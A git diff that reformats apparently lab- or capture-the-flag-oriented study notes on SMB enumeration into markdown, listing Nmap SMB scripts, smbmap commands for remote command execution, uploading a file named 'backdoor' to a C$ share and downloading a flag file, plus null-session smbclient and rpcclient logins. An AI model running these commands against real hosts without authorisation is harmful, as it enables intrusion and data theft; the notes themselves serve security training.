@@ -1,93 +1,152 @@
-## SMB - Windows Discover & Mount
+# Windows Discover & Mount
 - SMB= Server Message Block
-- SMB is a Windows implementation of a file sharing
+- SMB is a Windows implementation of a file-sharing
 - SMB uses ports 139 or 445
 
-SMB - Nmap Scripts
-•	smb-protocols IP
-	Shows SMB Protocol dialects
-	Issue: SMB v1
-•	script smb-protocols IP
-	Shows SMB Protocol dialects
-	Issue: SMB v1
-•	smb-security-mode IP
-	Issue: Messege_signing: disabled
-•	smb-enum-sessions IP
+# Nmap Scripts
+```
+smb-protocols
+```
+- Shows SMB Protocol dialects
+- Issue: SMB v1
+  
+```
+script smb-protocols
+```
+- Shows SMB Protocol dialects
+- Issue: SMB v1
 
-*Giving arguments to smb-enum-sessions will provide additional information
-•	smb-enum-sessions --script-args smbusername=administrator,smbpassword=password IP_address
-•	smb-enum-shares IP
-	Shows all the SMB shares including Guest, IPC, and Print etc.
-•	smb-enum-shares --script-args smbusername=administrator,smbpassword=password IP_address
-	Shows permissions to the shared accounts
-•	smb-enum-users --script-args smbusername=administrator,smbpassword=password IP_address
-	Issue: See the flags 
-•	smb-enum-stats --script-args smbusername=administrator,smbpassword= password IP_address
-	Server statistics:
-o	How many files are sent?
-o	Failed Logins
-o	Permissions etc.
-•	smb-enum-domains --script-args smbusername=administrator,smbpassword= password IP_address
-Names of connected Groups
-•	smb-enum-groups --script-args smbusername=administrator,smbpassword= password IP_address
-Provides list of users in Groups
-•	smb-enum-services --script-args smbusername=administrator,smbpassword= password IP_address
-Stat about running services
-•	smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password IP_address
- 		“ls” tells us what's inside each of the shares like finding directory
+```
+smb-security-mode 
+```
+- Issue: Messege_signing: disabled
 
-SMB – SMBMap
+```
+smb-enum-sessions 
+```
 
-•	Nmap script: smb-protocols IP
-Shows SMB Protocol dialects
-Issue:
-	 		SMB v1
+*Giving arguments to smb-enum-sessions will provide additional information*
 
-TOOL: smbmap
->> smbmap -u username -p "" -d . -H IP_addr
- Shows Permissions of an account with null password
-•	-d = directory to see
-•	-H = Host IP address
->> smbmap -u administrator -p smbserver_771 -H IP_addr -x "ipconfig"
-•	-x = command to execute
-•	
-After getting SMB connection:
->> smbmap -u administrator -p password -H IP_addr -L
-•	-L = List out the contents of different drives
->> smbmap -u administrator -p password -H IP_addr -r 'C$'
-•	-r = listing a drive content
+```
+smb-enum-sessions --script-args smbusername=administrator,smbpassword=password IP_address
+```
 
-Uploading file to target device:
-Create a file (named 'backdoor') in attacker PC
->> touch backdoor
-•	Uploading 'backdoor' file to target device where the flag is located
->> smbmap -u administrator -p password -H IP_addr --upload "/root/backdoor" "C$\backdoor"
-•	Check again if 'backdoor' file is uploaded:
->> smbmap -u administrator -p password -H IP_addr -r "C$"
+```
+smb-enum-shares 
+```
+- Shows all the SMB shares including Guest, IPC, and Print etc.
 
-Downloading file from target device:
->> smbmap -u administrator -p password -H IP_addr --download "C$\flag.txt"
-•	File will be downloaded to attacker device's “/root” folder.
+```
+smb-enum-shares --script-args smbusername=administrator,smbpassword=password 
+```
+- Shows permissions to the shared accounts
+
+```
+smb-enum-users --script-args smbusername=administrator,smbpassword=password 
+```
+- Issue: See the flags 
+
+```
+smb-enum-stats --script-args smbusername=administrator,smbpassword= password 
+```
+- Server statistics:
+	- How many files are sent?
+	- Failed Logins
+	- Permissions etc.
+
+```
+smb-enum-domains --script-args smbusername=administrator,smbpassword=password 
+```
+- Names of connected Groups
+
+  
+```
+smb-enum-groups --script-args smbusername=administrator,smbpassword=password 
+```
+- Provides list of users in Groups
 
 
-SMB - Samba 1
-# Always check both TCP and UDP ports using Nmap
-Nmap Scripts: SMB-os-discovery
-Metasploit Script: auxiliary/scanner/smb/smb_version
-nmblookup: 
-•	nmblookup –h
-•	nmblookup -A IP_addr
-smbclient: 
-•	smbclient -h
-•	smbclient -L IP_addr -N
--L = List of Hosts
--N = Null Session = No password
+```
+smb-enum-services --script-args smbusername=administrator,smbpassword=password 
+```
+- Stat about running services
+  
+```
+smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password IP_address
+```
+- “smb-ls” tells us what's inside each of the shares like finding directory
 
-rpcclient:
-•	rpcclient -h
-•	rpcclient -U "" -N IP_addr
--U= Username
--N= Null Session= No Password
+# SMBMap
+
+### Nmap script: smb-protocols IP
+- Shows SMB Protocol dialects
+- Issue: SMB v1
+
+### TOOL: smbmap
+```
+smbmap -u username -p "" -d . -H IP_addr
+```
+- Shows Permissions of an account with a null password
+- -d = directory to see
+- -H = Host IP address
+
+```
+smbmap -u administrator -p smbserver_771 -H IP_addr -x "ipconfig"
+```
+- -x = command to execute
+  
+### After getting SMB connection:
+```
+smbmap -u administrator -p password -H IP_addr -L
+```
+- -L = List out the contents of different drives
+
+```
+smbmap -u administrator -p password -H IP_addr -r 'C$'
+```
+- -r = listing a drive content
+
+### Uploading file to target device:
+- Create a file (named 'backdoor') in the attacker's device
+```
+touch backdoor
+```
+- Uploading 'backdoor' file to the target device where the flag is located
+```
+smbmap -u administrator -p password -H IP_addr --upload "/root/backdoor" "C$\backdoor"
+```
+- Check again if the 'backdoor' file is uploaded:
+```
+smbmap -u administrator -p password -H IP_addr -r "C$"
+```
+### Downloading file from target device:
+```
+smbmap -u administrator -p password -H IP_addr --download "C$\flag.txt"
+```
+- File will be downloaded to the attacker device's “/root” folder.
+
+
+# SMB - Samba 1
+* Always check both TCP and UDP ports using Nmap *
+
+### Nmap Scripts: SMB-os-discovery
+### Metasploit Script: auxiliary/scanner/smb/smb_version
+### nmblookup: 
+• nmblookup –h
+• nmblookup -A IP_addr
+### smbclient: 
+```
+smbclient -h
+smbclient -L IP_addr -N
+```
+- -L = List of Hosts
+- -N = Null Session = No password
+
+### rpcclient:
+• rpcclient -h
+• rpcclient -U "" -N IP_addr
+- -U= Username
+- -N= Null Session= No Password
 
 
 SMB - Samba 2
